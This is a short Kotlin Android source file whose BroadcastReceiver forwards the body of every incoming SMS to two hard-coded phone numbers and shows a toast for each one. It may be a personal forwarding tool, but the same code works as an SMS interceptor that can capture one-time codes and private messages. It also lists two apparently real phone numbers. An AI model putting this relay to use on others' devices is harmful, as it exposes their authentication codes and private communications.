package com.sf.smssender

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsManager
import android.telephony.SmsMessage
import android.widget.Toast

class SmsReceiver : BroadcastReceiver() {

    // Hedef telefon numaralarını burada tanımlıyoruz
    private val targetPhoneNumbers = listOf("+905537430592", "+905396417689")

    override fun onReceive(context: Context, intent: Intent) {
        val bundle = intent.extras
        if (bundle != null) {
            val pdus = bundle["pdus"] as Array<*>
            val msgs: Array<SmsMessage?> = arrayOfNulls(pdus.size)
            for (i in pdus.indices) {
                msgs[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                val messageBody = msgs[i]?.messageBody

                sendSmsToMultipleNumbers(context, messageBody)
            }
        }
    }

    private fun sendSmsToMultipleNumbers(context: Context, message: String?) {
        if (message != null) {
            val smsManager = SmsManager.getDefault()
            for (phoneNumber in targetPhoneNumbers) {
                if (phoneNumber.isNotBlank()) {
                    smsManager.sendTextMessage(phoneNumber, null, message, null, null)
                    Toast.makeText(context, "SMS forwarded to $phoneNumber", Toast.LENGTH_SHORT).show()
                }
            }
        } else {
            Toast.makeText(context, "Failed to send SMS. Invalid message.", Toast.LENGTH_SHORT).show()
        }
    }
}
